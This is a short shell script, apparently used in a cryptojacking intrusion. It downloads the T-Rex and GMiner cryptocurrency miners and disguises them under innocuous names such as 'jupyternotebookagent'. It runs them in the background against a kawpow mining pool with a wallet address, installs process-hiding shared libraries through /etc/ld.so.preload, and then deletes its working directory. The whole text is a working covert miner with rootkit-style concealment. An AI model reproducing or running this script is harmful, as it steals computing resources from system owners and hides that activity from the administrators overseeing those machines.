mkdir /tmp/ml && cp -r Makefile processhider.c /tmp/ml/ && cd /tmp/ml
wget https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz
tar xf t-rex-0.26.8-linux.tar.gz
cp t-rex ../jupyternotebookagent
./tmp/jupyternotebookagent -a kawpow -o stratum+tcp://xna.2miners.com:6060 --user NibTPifN31vLNqZK1zUTX7LpeM2zAxw6Ek.RIG_3 -p x &
make
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
wget https://github.com/develsoftware/GMinerRelease/releases/download/3.43/gminer_3_43_linux64.tar.xz
tar xvf gminer_3_43_linux64.tar.xz 
cp miner ../neptun
./tmp/neptun --algo kawpow --server xna.2miners.com:6060 --user NibTPifN31vLNqZK1zUTX7LpeM2zAxw6Ek.RIG_4 -p x & 
cd amd && make
mv surec.so /usr/local/lib/
echo /usr/local/lib/surec.so >> /etc/ld.so.preload
cd ../../ && rm -rf ml/

